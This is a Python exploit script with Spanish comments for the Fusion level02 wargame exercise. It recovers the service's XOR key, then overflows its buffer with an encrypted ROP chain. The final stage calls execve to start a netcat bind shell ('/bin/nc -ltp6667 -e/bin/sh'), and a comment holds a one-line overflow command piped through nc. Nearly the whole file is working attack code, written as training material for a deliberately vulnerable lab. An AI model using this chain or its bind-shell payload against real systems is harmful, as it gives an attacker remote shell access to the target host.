# Ejercicio Fusion 02 : exploit-exercices.com
# Fuente de gran parte del codigo es de:
# http://www.kroosec.com/2013/03/fusion-level02.html
# Solo se ha comentado el codigo como valor aÃ±adido

import socket
import time
from time import sleep
from struct import pack

# Nota:
# Provocamos el overflow: python -c 'print "E"+"\x14\x00\x02\x00"+131088*"A"+4*"B"+"Q"' | nc localhost 20002
# Funcion que cifra un texto con XOR
# @text: texto que se va a cifrar
# @key: clave con la que se va a hacer el XOR del texto
# @keysize: tamano de la clave

def encrypt(text, key, keysize):
    return "".join([chr(ord(x) ^ ord(key[ i % keysize])) for i, x in enumerate(text)])


# Funcion que aplica un XOR entre dos strings : s1 ^ s2  
# @a: String para aplicar la funcion XOR  
# @b: String para aplicar la funcion XOR

def xorstr(a, b):
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

############
# MAIN
############

HOST = 'localhost'    # The remote host
PORT = 20002             # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
sleep(0.5)
s.recv(1024)

##############################################################
# Paso 1 
# Objetivo: Ciframos 128 bytes y obtenemos la key
# Se elige cifrar 128 bytes porque este el tamano de la clave
#############################################################

# La clave de 32 elementos de 4 bytes cada elemento. 32 x 4 = 128 bytes
keysize = 128
# El tamano en Little Endian
size_buffer = pack("<L",128)
# Rellenamos el buffer 128 A's
data_buffer = 128*"A"
# Construimos el payload a enviar
payload = "E"+size_buffer+data_buffer
s.sendall(payload)
sleep(0.5)
# Recibimos el resultado de cifrar el mensaje
result = s.recv(2048)
# Recogemos los 128 bytes cifrados
cifrado = result[-keysize:]
# Obtenemos la clave de 128 bytes
key = xorstr(data_buffer,cifrado)

# Se comprueba que la clave este correcta
if len(key) != keysize or key.find("encryption") != -1:
    print "Key extraction fail."
    exit(1)

##############################################################################
# Paso 2
# Objetivo: provocamos el overflow, pero con los datos cifrados con la clave 
# de manera que cuando el programa le aplique el XOR tendremos lo que queremos 
# inyectar
##############################################################################

# Preparamos el payload a inyectar
# eip = 4*"B"

tam_buffer = 131088 # Valor en hex = 0x00020010

## STAGE 0 
## 0x8048b13L: pop ebp ; ret ;
## Objetivo: Fijar EBP y que sea por tanto la nueva base de la pila
## EBP => 0x0804b420
## Elegimos como direccion para el nuevo frame de la pila, la de la seccion .bss
## como se describe en el paper de vnsecurity
## Esto lo fijamos para cuando nread vuelva sea este el valor que restaure

popebp = pack ("<L",0x08048b13)
ebp = pack("<L", 0x0804b420)

## Ahora apuntamos a la funcion nread y apilamos sus parametros.
## Con esto haremos la copia de datos al nuevo frame de la pila
## que usaremos en el stage1
## La llamada sera: nread(0,0x0804b420,100)

nread = pack("<L", 0x0804952d)
fd = pack("<L", 0)
bss = pack("<L", 0x0804b420)
size = pack("<L", 100)

# Una vez hayamos ejecutado la funcion nread debemos salir
# y situarnos ahora si, en el nuevo frame. Para eso fijaremos
# leave ; ret ; => 0x8048b41L

leaveret = pack("<L", 0x08048b41)

# Construimos el payload del stage0

payload_stage0 = popebp + ebp + nread + leaveret + fd + bss + size
datos = tam_buffer * "A" + payload_stage0

datos_cifrados = encrypt(datos,key,keysize) 
size_buf_le = pack("<L",len(datos_cifrados)) # Hacemos el LE del entero
payload = "E"+size_buf_le+datos_cifrados+"Q"

# Enviamos el payload
s.sendall(payload)
# Clean socket.
s.recv(0xffffff)
# Delay  
sleep(0.5)

# Ahora vamos a construir el stage1 y enviar los datos que se ubicaran en nuestra pila
# Los primeros 4 bytes (variable pad) son de relleno porque al ejecutar leave ; => ret mov esp, ebp ; pop ebp ; ret 
# tendremos que cargar lo que este en ese momento en la pila en EBP, en nuestro cargaremo DDDD
# Los siguientes bytes seran lo que se ejecutara
# Recordemos que hemos reservado 100 bytes con el nread

base = 0x0804b420
null = pack("<L",0x0) 
filler = "DDDD" # relleno para salvar el pop ebp de la instruccion leave
execve = pack("<L", 0x080489b0) # execve@plt para lanzar el backdoor
exit = pack("<L", 0x08048960) # exit@plt para salir bien del programa
args = pack("<L", base + 24) # direccion de los argumentos del 2nd arg para execve() {"/bin/nc", "-lp6667", "-e/bin/sh", NULL}
envp = null  # tercer argumento para execve()

data_offset = 40 # filler + @execve + @exit + 3 execve args + args[4] == 40
# execve() arguments
# 0x0804b420 = stack base
binnc = pack("<L", base + data_offset) # tiene un tamano /bin/nc de 7 bytes.
ncarg1 = pack("<L", base + data_offset + 8) # -ltp6667 is 8 bytes after binnc
ncarg2 = pack("<L", base + data_offset + 17) # -e/bin/sh is 17 bytes after binnc

stage1 = filler + execve + exit + binnc + args + envp
stage1 += binnc + ncarg1 + ncarg2 + null
stage1 += "/bin/nc\x00" + "-ltp6667\x00" + "-e/bin/sh\x00"
junk = "E" * (100 - len(stage1))
s.send(stage1+junk)

s.close()
